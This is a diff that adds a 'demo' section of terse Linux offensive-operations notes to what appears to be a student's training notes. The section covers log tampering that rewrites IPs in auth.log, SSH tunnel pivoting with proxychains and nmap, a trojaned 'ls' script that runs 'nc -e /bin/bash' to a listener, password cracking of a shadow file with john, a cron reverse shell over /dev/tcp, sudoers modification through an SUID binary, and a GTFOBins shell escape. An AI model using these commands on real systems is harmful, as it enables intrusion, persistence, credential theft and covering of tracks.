@@ -3897,6 +3897,41 @@ Reading Rsyslog
 
 
 
+## OPNODES LINUX (DEMO)
+
+Log Cleaning
+	◦	grep '21:51:32|10:02:15' auth.log > auth.log2
+	◦	sed -i 's/172.16.34.4/192.168.1.103/g' auth.log2
+	◦	md5sum auth.log2
+	•	ssh -MS /tmp/grey student@10.50.29.242
+	•	ssh -S /tmp/grey dummy -O forward -L1111:192.168.28.105:2222
+	•	ssh -MS /tmp/black comrade@127.0.0.1 -p 1111
+	•	ssh -S /tmp/black dummy -O forward -D9050
+	•	proxychains nmap -T5 192.168.28.12 -p -
+	•	ssh -S /tmp/black dummy -O forward -L2222:192.168.28.27:22
+	•	ssh -S /tmp/black dummy -O forward -L2222:192.168.28.12:22
+	•	ssh -X comrade@127.0.0.1 -p 2222
+	◦	vim /var/tmp/ls and in /tmp/ls
+	▪	#!/bin/bash
+	▪	nc 10.50.20.183 6789 -e /bin/bash
+	◦	chmod +x both scripts
+	◦	open a nc on lin-ops
+	▪	nc -lvp 6789
+	•	/usr/sbin/john --wordlist=words.txt shadow.txt
+	•	/usr/sbin/john --show shadow.txt
+	•	ssh -X zeus@127.0.0.1 -p 2222
+	•	crontab -e
+	◦	* * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.28.135/33403 0>&1'
+	◦	ls  /tmp
+	•	find / -type f -perm /6000 -ls 2>/dev/null
+	◦	/var/tmp/testbed/unknown
+	▪	file unknown to see what it is
+	▪	see what the executable is doing by trying to pass arguments to it
+	◦	./unknown /etc/sudoers "comrade ALL=(ALL:ALL) ALL"
+	▪	add comrade with full permissions to the /etc/sudoers file
+	◦	echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | sudo at now; tail -f /dev/null
+	▪	gtfobins to use at found with the find command to get shell access
+
 
 
 
